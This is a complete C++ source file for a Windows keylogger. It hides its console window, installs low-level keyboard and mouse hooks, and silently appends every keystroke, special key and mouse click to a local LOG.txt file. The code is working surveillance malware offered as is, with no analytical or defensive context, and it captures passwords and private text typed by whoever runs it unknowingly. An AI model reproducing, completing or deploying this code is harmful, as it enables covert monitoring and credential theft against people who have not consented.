

//#define _WIN32_WINNT 0x0500
#include<Windows.h>
#include<stdio.h>

using namespace std;
 
HHOOK keyboard_hHock = NULL; // Keyboard Hook
HHOOK mouse_hHock = NULL; // Mouse Hook
 

const char* file = "LOG.txt"; // Path to the file where the key logs are saved


// Save - Pressed Key ------------------------------------------------------------------------------
#pragma warning (disable : 4996)
void SaveKey(const char* key)
{
    FILE* outputFile;      
    outputFile = fopen(file, "a+"); // "a+" = Append Mode
    fprintf(outputFile, "%s", key);  // "%s" Write the key as string to the file
    fclose(outputFile);      
}




// Convert code to  Local language char --------------------------------------------------------------
void ConvertToLocalLanguageChar(KBDLLHOOKSTRUCT  kbdStruct)
{
    unsigned char keyboardState[256];
    for (int i = 0; i < 256; ++i)
        keyboardState[i] = static_cast<unsigned char>(GetKeyState(i));

    wchar_t wbuffer[3] = { 0 };

    // Convert to Unicode // Multi Language characters 
    int result = ToUnicodeEx(
        kbdStruct.vkCode,
        kbdStruct.scanCode,
        keyboardState,
        wbuffer,
        sizeof(wbuffer) / sizeof(wchar_t), 0,
        GetKeyboardLayout(GetWindowThreadProcessId(GetForegroundWindow(), NULL)));

    // If sucessfully converted
    if (result > 0)
    {
        char buffer[5] = { 0 };
        WideCharToMultiByte(CP_UTF8, 0, wbuffer, 1, buffer, sizeof(buffer) / sizeof(char), 0, 0);
        SaveKey(buffer); // Save the Key
    }
}








 // Hide console ------------------------------------------------------------------------------------
void HideConsole()
{
	// Handle to a window - part of win32 api
	HWND handle;
	AllocConsole();	 // Initializes standard input, standard output, and standard error handles for the new console
	handle = FindWindowA("ConsoleWindowClass", NULL);
	ShowWindow(handle, 0);
}





KBDLLHOOKSTRUCT  kbdStruct;
 
 
// HOOK -----------------------------------------------------------------------------------------------
#pragma warning (disable : 4996)
LRESULT CALLBACK LowLevelHook(int nCode, WPARAM wParam, LPARAM lParam)
{
    if (nCode >= HC_ACTION) // Checks if wParam and lParam contain valid data or not. If nCode is HC_ACTION (0), then they do, otherwise they do not.
    {
        //PKBDLLHOOKSTRUCT p = (PKBDLLHOOKSTRUCT)(lParam); // Contains information about a low-level keyboard input event.
        kbdStruct = *((KBDLLHOOKSTRUCT*)lParam);    //  // lParam is the pointer to the struct containing the data needed, so cast and assign it to kdbStruct.  


         // If valid keyboard code 
        if (kbdStruct.vkCode != 0)
        {
               // If Key is pressed
               if (wParam == WM_KEYDOWN || wParam == WM_SYSKEYDOWN)
               {
                   //switch (p->vkCode) {
                   switch (kbdStruct.vkCode) {
            
                        // Special Keys / Invisible keys     

                        case VK_SNAPSHOT:	SaveKey("<PRINT_SCREEN>"); break;
                        case VK_APPS:	    SaveKey("<APP_KEY>");   break;
                        case VK_LWIN:	    SaveKey("<L_WIN>");     break;
                        case VK_RWIN:	    SaveKey("<R_WIN>");     break;
                        case VK_PRIOR:	    SaveKey("<PG_UP>");     break;
                        case VK_NEXT:	    SaveKey("<PG_DOWN>");   break;
                        case VK_ESCAPE:	    SaveKey("<ESC>");    	break;
                        case VK_CAPITAL:	SaveKey("<CAPLOCK>");	break;
                        case VK_SHIFT:		SaveKey("<SHIFT>");		break;
                        case VK_RMENU:		SaveKey("<R_ALT>");		break;
                        case VK_LMENU:		SaveKey("<L_ALT>");		break;
                        case VK_LCONTROL:	SaveKey("<LCTRL>");		break;
                        case VK_RCONTROL:	SaveKey("<RCTRL>");		break;
                        case VK_INSERT:		SaveKey("<INSERT>");    break;
                        case VK_END:		SaveKey("<END>");		break;
                        case VK_HOME:	    SaveKey("<HOME>");      break;
                        case VK_PRINT:		SaveKey("<PRINT>");		break;
                        case VK_DELETE:		SaveKey("<DEL>");		break;
                        case VK_BACK:		SaveKey("<BK>");	    break;
                        case VK_RETURN:		SaveKey("\n");			break;
                                             
                        case VK_LEFT:		SaveKey("<LEFT>");		break;
                        case VK_RIGHT:		SaveKey("<RIGHT>");		break;
                        case VK_UP:			SaveKey("<UP>");	    break;
                        case VK_DOWN:		SaveKey("<DOWN>");		break;


                        case VK_F1:		SaveKey("<F1>");		break;
                        case VK_F2:		SaveKey("<F2>");		break;
                        case VK_F3:		SaveKey("<F3>");		break;
                        case VK_F4:		SaveKey("<F4>");		break;
                        case VK_F5:		SaveKey("<VK_F5>");		break;
                        case VK_F6:		SaveKey("<VK_F6>");		break;
                        case VK_F7:		SaveKey("<VK_F7>");		break;
                        case VK_F8:		SaveKey("<VK_F8>");		break;
                        case VK_F9:		SaveKey("<VK_F9>");		break;
                        case VK_F10:    SaveKey("<VK_F10>");	break;
                        
                         // Ordinary keys / Visible keys
                        default:
                            ConvertToLocalLanguageChar(kbdStruct); // Convert to local language char
                   }
               }
               else   // Mouse Actions
               {
                   switch (wParam)
                   {
                        case WM_LBUTTONDOWN: SaveKey("<L_MOUSE>"); break;
                        case WM_RBUTTONDOWN: SaveKey("<R_MOUSE>"); break;
                        case WM_MBUTTONDOWN: SaveKey("<M_MOUSE>"); break;
                        case WM_MOUSEWHEEL: SaveKey("<MOUSE_WHEEL>"); break;

                   default:
                       break;
                   }
               }
        }
       
    }
    return CallNextHookEx(keyboard_hHock, nCode, wParam, lParam);  // Call the next hook so we get the next
}







// MAIN -------------------------------------------------------------------------------------------------
int main()
{
    // Hide Console
    HideConsole();

    MSG msg;
    keyboard_hHock = SetWindowsHookEx(WH_KEYBOARD_LL, LowLevelHook, NULL, NULL);   // The hook (keyboard hook)
    mouse_hHock = SetWindowsHookEx(WH_MOUSE_LL, LowLevelHook, NULL, NULL);   // The hook (Mouse hook)
   
    // Listen for msg / listen for keys
    while (!GetMessage(&msg, NULL, NULL, NULL))
    {
        TranslateMessage(&msg);
        DispatchMessage(&msg);
    }

    UnhookWindowsHookEx(keyboard_hHock); // Remove hook before closing tha app
    UnhookWindowsHookEx(mouse_hHock); // Remove hook before closing tha app
}















